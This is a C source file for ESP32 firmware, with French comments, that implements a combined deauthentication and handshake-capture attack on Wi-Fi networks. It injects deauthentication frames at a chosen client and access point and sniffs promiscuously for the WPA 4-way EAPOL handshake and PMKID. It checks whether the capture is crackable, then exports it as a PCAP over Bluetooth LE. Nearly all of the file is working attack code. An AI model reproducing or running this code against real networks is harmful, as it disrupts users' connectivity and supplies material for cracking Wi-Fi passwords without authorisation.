#include "steal_deauth.h"
#include "esp_rom_sys.h"   // esp_rom_delay_us

static const char* TAG = "STEAL_DEAUTH";

// ======= Capture buffers / state =======
// NB : les variables partagées entre le callback RX (tâche WiFi) et la boucle
// de steal_task sont volatile pour garantir la visibilité inter-tâches/cœurs.
static pcap_frame_t captured_frames[MAX_CAPTURED_FRAMES];
static volatile uint32_t frame_count        = 0;
static volatile uint8_t  eapol_bitmask      = 0;    // bits EAPOL_M1..M4
static volatile uint8_t  beacons_stored     = 0;
static volatile bool     have_pmkid         = false;
static uint8_t  pmkid[16]                   = {0};
static volatile bool     buffer_full_logged = false;

static volatile steal_state_t steal_state    = STEAL_IDLE;
static capture_mode_t         g_capture_mode = CAPTURE_DEAUTH;

// ======= Helpers =======
static bool handshake_crackable(void) {
    uint8_t b = eapol_bitmask;
    return ((b & EAPOL_M1) && (b & EAPOL_M2)) ||
           ((b & EAPOL_M2) && (b & EAPOL_M3)) ||
           ((b & EAPOL_M3) && (b & EAPOL_M4));
}

static void store_frame(wifi_promiscuous_pkt_t *pkt) {
    if (frame_count >= MAX_CAPTURED_FRAMES) {
        if (!buffer_full_logged) {
            // Flag only — le log/notify BLE est émis depuis la boucle de la tâche
            buffer_full_logged = true;
        }
        return;
    }
    pcap_frame_t *f = &captured_frames[frame_count];
    f->timestamp_us = esp_timer_get_time();
    f->len = pkt->rx_ctrl.sig_len;
    if (f->len > MAX_FRAME_SIZE) f->len = MAX_FRAME_SIZE;
    memcpy(f->data, pkt->payload, f->len);
    frame_count++;
}

// Extrait le PMKID d'un message EAPOL M1 (KDE RSN 00-0F-AC type 4)
static void try_extract_pmkid(const uint8_t *eapol, int avail) {
    if (have_pmkid) return;
    if (avail < 99) return;                       // header EAPOL-Key + key_data_len
    uint16_t kd_len = (eapol[97] << 8) | eapol[98];
    if (kd_len == 0) return;
    if (avail < 99 + (int)kd_len) kd_len = (uint16_t)(avail - 99);   // clamp
    const uint8_t *kd = &eapol[99];
    int i = 0;
    while (i + 2 < (int)kd_len) {
        uint8_t tag = kd[i];
        uint8_t len = kd[i + 1];
        if (len == 0) break;
        if (tag == 0xDD && len >= 20 && (i + 2 + len) <= (int)kd_len) {
            if (kd[i+2] == 0x00 && kd[i+3] == 0x0F && kd[i+4] == 0xAC && kd[i+5] == 0x04) {
                memcpy(pmkid, &kd[i+6], 16);
                have_pmkid = true;
                return;
            }
        }
        i += 2 + len;
    }
}

// ======= SNIFFER (callback promiscuous — NON BLOQUANT) =======
// Ne fait que filtrer, stocker et mettre à jour des drapeaux.
// AUCUN ESP_LOGI / BleManager_SendStatus ici (sinon pertes de paquets RX).
static void IRAM_ATTR steal_sniffer_handler(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!captureActive) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    const uint8_t *target_ap = deauth_get_ap_target();

    // ===== MGMT : beacon + assoc/reassoc de l'AP cible =====
    if (type == WIFI_PKT_MGMT) {
        if (pkt->rx_ctrl.sig_len < 24) return;
        const uint8_t *a1 = &frame[4];
        const uint8_t *a2 = &frame[10];
        const uint8_t *a3 = &frame[16];
        bool involves_ap = (memcmp(a1, target_ap, 6) == 0) ||
                           (memcmp(a2, target_ap, 6) == 0) ||
                           (memcmp(a3, target_ap, 6) == 0);
        if (!involves_ap) return;

        uint8_t fc0 = frame[0];
        if (fc0 == 0x80) {                 // Beacon (pour l'ESSID)
            if (beacons_stored < MAX_STORED_BEACONS) {
                store_frame(pkt);
                beacons_stored++;
            }
        } else if (fc0 == 0x00 || fc0 == 0x10 ||   // Assoc req/resp
                   fc0 == 0x20 || fc0 == 0x30) {    // Reassoc req/resp
            store_frame(pkt);
        }
        return;
    }

    // ===== DATA : EAPOL =====
    if (type == WIFI_PKT_DATA) {
        if (memcmp(&frame[4],  target_ap, 6) != 0 &&
            memcmp(&frame[10], target_ap, 6) != 0) return;

        uint8_t subtype = (frame[0] >> 4) & 0x0F;
        int hdr_len = (subtype == 0x08) ? 26 : 24;   // QoS Data => +2 octets
        if (pkt->rx_ctrl.sig_len < hdr_len + 8) return;

        const uint8_t *llc = &frame[hdr_len];
        if (llc[0] != 0xAA || llc[1] != 0xAA) return;

        uint16_t ethertype = (llc[6] << 8) | llc[7];
        if (ethertype != 0x888E) return;              // EAPOL

        const uint8_t *eapol = &llc[8];
        int avail = (int)pkt->rx_ctrl.sig_len - (int)(eapol - frame);
        if (avail < 7) return;

        if (eapol[1] != 0x03) {                        // pas EAPOL-Key -> on stocke quand même
            store_frame(pkt);
            return;
        }

        uint16_t key_info = (eapol[5] << 8) | eapol[6];
        bool ack    = (key_info >> 7) & 1;
        bool mic    = (key_info >> 8) & 1;
        bool secure = (key_info >> 9) & 1;

        uint8_t msg = 0;
        if      ( ack && !mic)            msg = 1;
        else if (!ack &&  mic && !secure) msg = 2;
        else if ( ack &&  mic)            msg = 3;
        else if (!ack &&  mic &&  secure) msg = 4;

        if (msg) eapol_bitmask |= (1 << msg);
        if (msg == 1) try_extract_pmkid(eapol, avail);

        store_frame(pkt);

        // Transitions d'état (drapeaux uniquement)
        if (msg == 1 && steal_state == STEAL_DEAUTHING) {
            steal_state = STEAL_LISTENING;   // stop deauth, on laisse le handshake se faire
        }
        if (have_pmkid && steal_state != STEAL_HANDSHAKE_CAPTURED) {
            steal_state = STEAL_PMKID_CAPTURED;
        }
        if (handshake_crackable()) {
            steal_state = STEAL_HANDSHAKE_CAPTURED;
        }
        return;
    }
}

// ======= PCAP EXPORT =======
static uint32_t compute_crc32(const uint8_t *data, size_t len) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (int j = 0; j < 8; j++) {
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
        }
    }
    return ~crc;
}

static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_encode(const uint8_t *in, size_t in_len, char *out, size_t out_max) {
    size_t out_len = 0;
    for (size_t i = 0; i < in_len; i += 3) {
        if (out_len + 4 >= out_max) return -1;
        uint32_t val = in[i] << 16;
        if (i + 1 < in_len) val |= in[i+1] << 8;
        if (i + 2 < in_len) val |= in[i+2];

        out[out_len++] = b64_table[(val >> 18) & 0x3F];
        out[out_len++] = b64_table[(val >> 12) & 0x3F];
        out[out_len++] = (i + 1 < in_len) ? b64_table[(val >> 6) & 0x3F] : '=';
        out[out_len++] = (i + 2 < in_len) ? b64_table[val & 0x3F]        : '=';
    }
    out[out_len] = '\0';
    return out_len;
}

static uint8_t* build_pcap_buffer(uint32_t *out_size) {
    uint32_t total = sizeof(pcap_global_header_t);
    for (uint32_t i = 0; i < frame_count; i++) {
        total += sizeof(pcap_record_header_t) + captured_frames[i].len;
    }

    uint8_t *buf = (uint8_t*)malloc(total);
    if (!buf) {
        ESP_LOGE(TAG, "malloc failed for PCAP buffer (%lu bytes)", total);
        return NULL;
    }

    uint32_t offset = 0;
    pcap_global_header_t gh = {
        .magic_number  = 0xA1B2C3D4,
        .version_major = 2,
        .version_minor = 4,
        .thiszone      = 0,
        .sigfigs       = 0,
        .snaplen       = 65535,
        .network       = 105  // IEEE 802.11
    };
    memcpy(buf + offset, &gh, sizeof(gh));
    offset += sizeof(gh);

    for (uint32_t i = 0; i < frame_count; i++) {
        pcap_frame_t *f = &captured_frames[i];
        uint32_t ts_sec  = (uint32_t)(f->timestamp_us / 1000000);
        uint32_t ts_usec = (uint32_t)(f->timestamp_us % 1000000);

        pcap_record_header_t rh = {
            .ts_sec   = ts_sec,
            .ts_usec  = ts_usec,
            .incl_len = f->len,
            .orig_len = f->len
        };
        memcpy(buf + offset, &rh, sizeof(rh));
        offset += sizeof(rh);
        memcpy(buf + offset, f->data, f->len);
        offset += f->len;
    }

    *out_size = offset;
    return buf;
}

void steal_export_pcap_ble(void) {
    if (frame_count == 0) {
        BleManager_SendStatus("LOG|STEAL|msg=NO_FRAMES_TO_EXPORT");
        return;
    }

    ESP_LOGI(TAG, "Building PCAP buffer (%lu frames)...", frame_count);

    uint32_t pcap_size = 0;
    uint8_t *pcap_buf = build_pcap_buffer(&pcap_size);
    if (!pcap_buf) {
        BleManager_SendStatus("LOG|STEAL|msg=PCAP_BUILD_FAILED");
        return;
    }

    uint32_t crc = compute_crc32(pcap_buf, pcap_size);

    char start_msg[128];
    snprintf(start_msg, sizeof(start_msg),
        "PCAP|START|size=%lu|frames=%lu", pcap_size, frame_count);
    BleManager_SendStatus(start_msg);
    vTaskDelay(pdMS_TO_TICKS(100));

    const int CHUNK_SIZE = 180;
    int chunk_index = 0;
    uint32_t sent = 0;
    char b64_buf[256];
    char msg_buf[300];

    while (sent < pcap_size) {
        uint32_t remaining = pcap_size - sent;
        uint32_t chunk_len = (remaining < CHUNK_SIZE) ? remaining : CHUNK_SIZE;

        int b64_len = base64_encode(pcap_buf + sent, chunk_len, b64_buf, sizeof(b64_buf));
        if (b64_len < 0) {
            ESP_LOGE(TAG, "base64 overflow at chunk %d", chunk_index);
            break;
        }

        snprintf(msg_buf, sizeof(msg_buf), "PCAP|CHUNK|%d|%s", chunk_index, b64_buf);
        BleManager_SendStatus(msg_buf);

        sent += chunk_len;
        chunk_index++;
        vTaskDelay(pdMS_TO_TICKS(25));   // throttle BLE (pas d'ACK sur les notifications)
    }

    char end_msg[64];
    snprintf(end_msg, sizeof(end_msg), "PCAP|END|crc=0x%08lX", crc);
    BleManager_SendStatus(end_msg);

    ESP_LOGI(TAG, "PCAP export done: %d chunks, %lu bytes, CRC=0x%08lX",
             chunk_index, pcap_size, crc);

    free(pcap_buf);
}

// ======= TASK =======
static void steal_task(void *vParameters) {
    const uint8_t *target_ap     = deauth_get_ap_target();
    const uint8_t *target_client = deauth_get_client_target();
    uint8_t attack_channel       = deauth_get_attack_channel();
    capture_mode_t mode          = g_capture_mode;

    // Reset état
    frame_count        = 0;
    eapol_bitmask      = 0;
    beacons_stored     = 0;
    have_pmkid         = false;
    buffer_full_logged = false;
    steal_state        = STEAL_IDLE;

    const char *mode_name = (mode == CAPTURE_PASSIVE) ? "PASSIVE" :
                            (mode == CAPTURE_PMKID)   ? "PMKID"   : "DEAUTH";
    char msg[128];
    snprintf(msg, sizeof(msg), "LOG|STEAL|msg=Capture start (mode=%s ch=%d)", mode_name, attack_channel);
    BleManager_SendStatus(msg);

    // Coexistence (BALANCE) + power save off
    configure_ble_coexistence();

    // Setup promiscuous UNE SEULE FOIS. On reste en mode AP pour pouvoir
    // injecter (WIFI_IF_AP) SANS jamais couper la capture.
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(steal_sniffer_handler);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(attack_channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(50));

    captureActive = true;
    steal_state   = (mode == CAPTURE_PASSIVE) ? STEAL_LISTENING : STEAL_DEAUTHING;

    uint32_t start          = esp_timer_get_time() / 1000;
    uint32_t max_ms         = (mode == CAPTURE_PASSIVE) ? 60000 : 20000;
    uint32_t last_progress  = start;
    uint32_t listening_since = 0;
    steal_state_t last_reported = STEAL_IDLE;

    const uint8_t reason_codes[] = { 0x01, 0x03, 0x07, 0x08 };
    int burst = 0;
    uint8_t packet[26];
    bool full_notified = false;

    while (deauthActive) {
        uint32_t now = esp_timer_get_time() / 1000;
        if (now - start >= max_ms) break;

        // Conditions de succès
        if (mode == CAPTURE_PMKID && have_pmkid) { steal_state = STEAL_PMKID_CAPTURED; break; }
        if (handshake_crackable())               { steal_state = STEAL_HANDSHAKE_CAPTURED; break; }

        // Injection deauth (DEAUTH & PMKID) tant que M1 pas encore vu.
        // On n'injecte PAS pendant que le handshake est en cours (état LISTENING)
        // pour ne pas casser la reconnexion. La capture reste TOUJOURS active.
        if (mode != CAPTURE_PASSIVE && steal_state == STEAL_DEAUTHING) {
            uint8_t reason = reason_codes[burst % 4];
            build_deauth_packet(packet, target_client, target_ap, target_ap, reason);
            send_with_retry(packet, 3);
            esp_rom_delay_us(800);
            build_deauth_packet(packet, target_ap, target_client, target_ap, reason);
            send_with_retry(packet, 3);
            burst++;
        }

        // Re-arme le deauth si M1 vu mais M2 ne vient pas (client abandonné)
        if (mode == CAPTURE_DEAUTH && steal_state == STEAL_LISTENING) {
            if (listening_since == 0) listening_since = now;
            if (now - listening_since > 3000 && !(eapol_bitmask & EAPOL_M2)) {
                steal_state = STEAL_DEAUTHING;
                eapol_bitmask &= ~EAPOL_M1;   // autorise un nouveau déclenchement
                listening_since = 0;
            }
        }

        // Notifications émises DEPUIS la boucle (jamais depuis le callback RX)
        if (steal_state != last_reported) {
            if (steal_state == STEAL_LISTENING)
                BleManager_SendStatus("LOG|STEAL|msg=M1 vu - ecoute du handshake");
            last_reported = steal_state;
        }
        if (buffer_full_logged && !full_notified) {
            BleManager_SendStatus("LOG|STEAL|msg=Buffer plein - capture tronquee");
            full_notified = true;
        }
        if (now - last_progress >= 2000) {
            snprintf(msg, sizeof(msg),
                "LOG|STEAL|msg=Ecoute... frames=%lu eapol=0x%02X",
                (unsigned long)frame_count, eapol_bitmask);
            BleManager_SendStatus(msg);
            last_progress = now;
        }

        // Yield : laisse le callback RX recevoir. Le sniffer n'est JAMAIS coupé.
        vTaskDelay(pdMS_TO_TICKS(mode == CAPTURE_PASSIVE ? 100 : 20));
    }

    // Fenêtre de grâce : tenter d'attraper M3/M4 après la 1ère paire exploitable
    if (steal_state == STEAL_HANDSHAKE_CAPTURED) {
        uint32_t g = esp_timer_get_time() / 1000;
        while (deauthActive &&
               (esp_timer_get_time() / 1000 - g) < 1500 &&
               !((eapol_bitmask & EAPOL_M3) && (eapol_bitmask & EAPOL_M4))) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }

    captureActive = false;
    esp_wifi_set_promiscuous(false);

    bool ok = (steal_state == STEAL_HANDSHAKE_CAPTURED) ||
              (steal_state == STEAL_PMKID_CAPTURED && have_pmkid);

    if (have_pmkid) {
        char p[96];
        snprintf(p, sizeof(p),
            "LOG|STEAL|msg=PMKID=%02x%02x%02x%02x%02x%02x...",
            pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5]);
        BleManager_SendStatus(p);
    }

    if (ok || frame_count > 0) {
        snprintf(msg, sizeof(msg),
            "LOG|STEAL|msg=%s - %lu frames eapol=0x%02X%s",
            ok ? "OK" : "PARTIEL", (unsigned long)frame_count,
            eapol_bitmask, have_pmkid ? " +PMKID" : "");
        BleManager_SendStatus(msg);
        vTaskDelay(pdMS_TO_TICKS(300));
        steal_export_pcap_ble();
    } else {
        steal_state = STEAL_FAILED;
        BleManager_SendStatus("LOG|STEAL|msg=ECHEC - aucune trame capturee");
    }

    restore_wifi_state();
    // steal n'appelle pas prepare_for_injection : original_mode peut être
    // obsolète. On force un retour déterministe en STA (mode sniffer-friendly).
    esp_wifi_set_mode(WIFI_MODE_STA);

    deauthActive   = false;
    captureActive  = false;
    isAttackActive = false;
    deauth_set_task_handle(NULL);
    vTaskDelete(NULL);
}

// ======= PUBLIC API =======
void start_deauth_steal_attack(char *target, char *ap, int channel, int mode) {
    if (deauthActive) {
        ESP_LOGW(TAG, "Attack already running");
        return;
    }
    if (deauth_get_task_handle() != NULL) {
        ESP_LOGW(TAG, "Task already exists");
        return;
    }

    uint8_t target_mac[6], ap_mac[6];
    if (!mac_str_to_bytes(target, target_mac) || !mac_str_to_bytes(ap, ap_mac)) {
        ESP_LOGE(TAG, "Invalid MAC format");
        return;
    }

    set_deauth_targets(ap_mac, target_mac);
    set_deauth_channel(channel);

    if (mode < CAPTURE_PASSIVE || mode > CAPTURE_PMKID) mode = CAPTURE_DEAUTH;
    g_capture_mode = (capture_mode_t)mode;

    deauthActive   = true;
    isAttackActive = true;

    TaskHandle_t handle = NULL;
    xTaskCreate(steal_task, "steal_task", 8192, NULL, 5, &handle);
    deauth_set_task_handle(handle);

    ESP_LOGI(TAG, "Steal task started (mode=%d)", mode);
    BleManager_SendStatus("LOG|STEAL|msg=STEAL_ATTACK_STARTED");
}

void stop_deauth_steal_attack(void) {
    if (!deauthActive) return;
    deauthActive  = false;
    captureActive = false;
    ESP_LOGI(TAG, "Steal attack stop requested");
}
